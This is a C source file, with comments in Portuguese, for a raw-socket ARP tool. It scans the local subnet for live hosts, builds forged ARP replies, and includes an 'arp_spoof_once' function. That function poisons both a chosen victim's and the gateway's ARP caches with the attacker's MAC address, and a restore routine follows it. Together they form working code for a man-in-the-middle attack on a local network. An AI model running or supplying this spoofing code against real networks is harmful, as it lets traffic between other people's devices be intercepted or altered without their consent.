#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <errno.h>
#include <pthread.h>

#include <arpa/inet.h>
#include <net/if.h>
#include <net/ethernet.h>
#include <netpacket/packet.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <net/if_arp.h>

#include "arp.h"

void mac_str_to_bytes(const char *mac_str, unsigned char mac[6]) {
    sscanf(mac_str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &mac[0], &mac[1], &mac[2],
           &mac[3], &mac[4], &mac[5]);
}

void mac_bytes_to_str(const unsigned char mac[6], char mac_str[18]) {
    snprintf(mac_str, 18, "%02x:%02x:%02x:%02x:%02x:%02x",
             mac[0], mac[1], mac[2],
             mac[3], mac[4], mac[5]);
}

int arp_open_socket(void) {
    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));

    if (sock < 0) {
        perror("socket raw ARP");
        exit(EXIT_FAILURE);
    }

    return sock;
}

void get_network_range(NetInterface netint, uint32_t *network, uint32_t *broadcast) {
    struct in_addr addr;
    struct in_addr mask;

    inet_pton(AF_INET, netint.ip, &addr);
    inet_pton(AF_INET, netint.mask, &mask);

    uint32_t ip_num = ntohl(addr.s_addr);
    uint32_t mask_num = ntohl(mask.s_addr);

    *network = ip_num & mask_num;
    *broadcast = *network | (~mask_num);
}

ArpPacket arp_build_request(NetInterface netint, const char *target_ip_str) {
    ArpPacket packet;
    memset(&packet, 0, sizeof(packet));

    unsigned char src_mac[6];
    mac_str_to_bytes(netint.mac, src_mac);

    struct in_addr sender_ip;
    struct in_addr target_ip;

    inet_pton(AF_INET, netint.ip, &sender_ip);
    inet_pton(AF_INET, target_ip_str, &target_ip);

    memset(packet.eth.dst_mac, 0xff, 6);
    memcpy(packet.eth.src_mac, src_mac, 6);
    packet.eth.eth_type = htons(ETH_P_ARP);

    packet.arp.htype = htons(ARPHRD_ETHER);
    packet.arp.ptype = htons(ETH_P_IP);
    packet.arp.hlen = 6;
    packet.arp.plen = 4;
    packet.arp.oper = htons(ARPOP_REQUEST);

    memcpy(packet.arp.sender_mac, src_mac, 6);
    packet.arp.sender_ip = sender_ip.s_addr;

    memset(packet.arp.target_mac, 0x00, 6);
    packet.arp.target_ip = target_ip.s_addr;

    return packet;
}

ArpPacket arp_build_reply(
    const char *fake_sender_ip_str,
    const char *fake_sender_mac_str,
    const char *target_ip_str,
    const char *target_mac_str
) {
    ArpPacket packet;
    memset(&packet, 0, sizeof(packet));

    unsigned char fake_sender_mac[6];
    unsigned char target_mac[6];

    mac_str_to_bytes(fake_sender_mac_str, fake_sender_mac);
    mac_str_to_bytes(target_mac_str, target_mac);

    struct in_addr fake_sender_ip;
    struct in_addr target_ip;

    inet_pton(AF_INET, fake_sender_ip_str, &fake_sender_ip);
    inet_pton(AF_INET, target_ip_str, &target_ip);

    memcpy(packet.eth.dst_mac, target_mac, 6);
    memcpy(packet.eth.src_mac, fake_sender_mac, 6);
    packet.eth.eth_type = htons(ETH_P_ARP);

    packet.arp.htype = htons(ARPHRD_ETHER);
    packet.arp.ptype = htons(ETH_P_IP);
    packet.arp.hlen = 6;
    packet.arp.plen = 4;
    packet.arp.oper = htons(ARPOP_REPLY);

    memcpy(packet.arp.sender_mac, fake_sender_mac, 6);
    packet.arp.sender_ip = fake_sender_ip.s_addr;

    memcpy(packet.arp.target_mac, target_mac, 6);
    packet.arp.target_ip = target_ip.s_addr;

    return packet;
}

void arp_send_packet(int sock, NetInterface netint, ArpPacket *packet) {
    struct sockaddr_ll addr;
    memset(&addr, 0, sizeof(addr));

    addr.sll_family = AF_PACKET;
    addr.sll_ifindex = if_nametoindex(netint.name);
    addr.sll_halen = ETH_ALEN;
    memcpy(addr.sll_addr, packet->eth.dst_mac, 6);

    if (sendto(sock, packet, sizeof(ArpPacket), 0,
               (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("sendto ARP");
        exit(EXIT_FAILURE);
    }
}


typedef struct {
    int sock;
    NetInterface netint;
    Host *hosts;
    int max_hosts;
    int *count;
    volatile int *receiving;
    pthread_mutex_t *hosts_mutex;
} ArpReceiverArgs;

static void *arp_receiver_thread(void *arg) {
    ArpReceiverArgs *args = (ArpReceiverArgs *)arg;
    unsigned char buffer[65536];

    while (*(args->receiving)) {
        fd_set readfds;
        FD_ZERO(&readfds);
        FD_SET(args->sock, &readfds);

        struct timeval timeout;
        timeout.tv_sec = 0;
        timeout.tv_usec = 100000; /* 100 ms */

        int ready = select(args->sock + 1, &readfds, NULL, NULL, &timeout);

        if (ready < 0) {
            if (errno == EINTR) continue;
            perror("select ARP scan");
            break;
        }

        if (ready == 0) {
            continue;
        }

        ssize_t bytes = recvfrom(args->sock, buffer, sizeof(buffer), 0, NULL, NULL);

        if (bytes < (ssize_t)sizeof(ArpPacket)) continue;

        ArpPacket *reply = (ArpPacket *)buffer;

        if (ntohs(reply->eth.eth_type) != ETH_P_ARP) continue;
        if (ntohs(reply->arp.oper) != ARPOP_REPLY) continue;

        struct in_addr sender_addr;
        sender_addr.s_addr = reply->arp.sender_ip;

        char sender_ip[INET_ADDRSTRLEN];
        char sender_mac[18];

        inet_ntop(AF_INET, &sender_addr, sender_ip, sizeof(sender_ip));
        mac_bytes_to_str(reply->arp.sender_mac, sender_mac);

        if (strcmp(sender_ip, args->netint.ip) == 0) continue;

        pthread_mutex_lock(args->hosts_mutex);
        host_add(args->hosts, args->count, args->max_hosts, sender_ip, sender_mac);
        pthread_mutex_unlock(args->hosts_mutex);
    }

    return NULL;
}

static void arp_load_cache(NetInterface netint, Host hosts[], int *count, int max_hosts) {
    FILE *file = fopen("/proc/net/arp", "r");

    if (file == NULL) {
        return;
    }

    char line[256];

    /* Ignora cabecalho. */
    if (fgets(line, sizeof(line), file) == NULL) {
        fclose(file);
        return;
    }

    while (fgets(line, sizeof(line), file) != NULL) {
        char ip[16];
        char hw_type[16];
        char flags[16];
        char mac[18];
        char mask[16];
        char device[64];

        int fields = sscanf(line, "%15s %15s %15s %17s %15s %63s",
                            ip, hw_type, flags, mac, mask, device);

        if (fields != 6) continue;
        if (strcmp(device, netint.name) != 0) continue;
        if (strcmp(mac, "00:00:00:00:00:00") == 0) continue;
        if (strcmp(ip, netint.ip) == 0) continue;

        host_add(hosts, count, max_hosts, ip, mac);
    }

    fclose(file);
}

int arp_scan(NetInterface netint, Host hosts[], int max_hosts) {
    uint32_t network;
    uint32_t broadcast;
    get_network_range(netint, &network, &broadcast);

    printf("\nIniciando ARP scan...\n\n");

    int sock = arp_open_socket();
    int count = 0;

    int rcvbuf = 1024 * 1024;
    if (setsockopt(sock, SOL_SOCKET, SO_RCVBUF, &rcvbuf, sizeof(rcvbuf)) < 0) {
        perror("setsockopt SO_RCVBUF");
    }

    volatile int receiving = 1;
    pthread_mutex_t hosts_mutex;
    pthread_mutex_init(&hosts_mutex, NULL);

    ArpReceiverArgs args;
    args.sock = sock;
    args.netint = netint;
    args.hosts = hosts;
    args.max_hosts = max_hosts;
    args.count = &count;
    args.receiving = &receiving;
    args.hosts_mutex = &hosts_mutex;

    pthread_t receiver_tid;

    if (pthread_create(&receiver_tid, NULL, arp_receiver_thread, &args) != 0) {
        perror("pthread_create ARP scan");
        close(sock);
        pthread_mutex_destroy(&hosts_mutex);
        return 0;
    }

    /* Faz mais de uma rodada porque celular/notebook pode economizar energia e responder atrasado. */
    for (int round = 0; round < 3; round++) {
        for (uint32_t target = network + 1; target < broadcast; target++) {
            struct in_addr target_addr;
            target_addr.s_addr = htonl(target);

            char target_ip[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, &target_addr, target_ip, sizeof(target_ip));

            if (strcmp(target_ip, netint.ip) == 0) continue;

            ArpPacket request = arp_build_request(netint, target_ip);
            arp_send_packet(sock, netint, &request);
            usleep(3000); /* 3 ms */
        }

        usleep(300000); /* 300 ms entre rodadas */
    }

    /* Da um tempo final para respostas atrasadas chegarem. */
    usleep(1000000);

    receiving = 0;
    pthread_join(receiver_tid, NULL);

    pthread_mutex_lock(&hosts_mutex);
    arp_load_cache(netint, hosts, &count, max_hosts);
    pthread_mutex_unlock(&hosts_mutex);

    pthread_mutex_destroy(&hosts_mutex);
    close(sock);
    return count;
}

void arp_spoof_once(NetInterface netint, Host victim, Host gateway) {

    int sock = arp_open_socket();

    ArpPacket to_victim = arp_build_reply(
        gateway.ip,
        netint.mac,
        victim.ip,
        victim.mac
    );

    ArpPacket to_gateway = arp_build_reply(
        victim.ip,
        netint.mac,
        gateway.ip,
        gateway.mac
    );

    arp_send_packet(sock, netint, &to_victim);
    arp_send_packet(sock, netint, &to_gateway);

    close(sock);
}

void arp_restore(NetInterface netint, Host victim, Host gateway) {
    int sock = arp_open_socket();

    ArpPacket to_victim = arp_build_reply(
        gateway.ip,
        gateway.mac,
        victim.ip,
        victim.mac
    );

    ArpPacket to_gateway = arp_build_reply(
        victim.ip,
        victim.mac,
        gateway.ip,
        gateway.mac
    );

    for (int i = 0; i < 5; i++) {
        arp_send_packet(sock, netint, &to_victim);
        arp_send_packet(sock, netint, &to_gateway);
        usleep(300000);
    }

    close(sock);
}